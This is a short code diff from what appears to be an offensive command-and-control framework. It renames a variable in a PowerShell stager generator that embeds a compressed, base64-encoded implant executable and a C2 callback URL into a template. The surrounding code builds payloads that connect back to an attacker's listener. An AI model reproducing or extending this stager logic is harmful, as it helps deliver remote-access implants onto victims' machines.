@@ -19,7 +19,7 @@ class STStager(Stager):
         }
 
     def generate(self, listener):
-        with open('./core/teamserver/data/naga.exe', 'rb') as dll:
+        with open('./core/teamserver/data/naga.exe', 'rb') as assembly:
             with open('core/teamserver/stagers/templates/posh.ps1') as template:
                 template = template.read()
                 c2_url = f"{listener.name}://{listener['BindIP']}:{listener['Port']}"
@@ -40,7 +40,7 @@ Invoke-{function_name} -Url "{c2_url}"
                 else:
                     template = template.replace("$Url", f'"{c2_url}"')
 
-                dll = dll.read()
-                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(dll))
-                template = template.replace("DATA_LENGTH", str(len(dll)))
+                assembly = assembly.read()
+                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly))
+                template = template.replace("DATA_LENGTH", str(len(assembly)))
                 return template
